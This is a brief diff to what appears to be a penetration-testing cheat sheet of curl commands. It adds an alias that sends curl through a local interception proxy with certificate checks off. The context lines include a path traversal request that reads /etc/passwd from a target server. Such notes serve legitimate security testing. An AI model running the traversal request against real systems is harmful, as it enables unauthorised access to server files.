@@ -13,3 +13,7 @@ curl --header "Content-Type: application/json" --request POST -d @data.json http
 ```bash
 curl --path-as-is http://$TARGET_URL/../../../../../../../../etc/passwd
 ```
+
+```bash
+alias burl="curl -x localhost:8080 -k "
+```
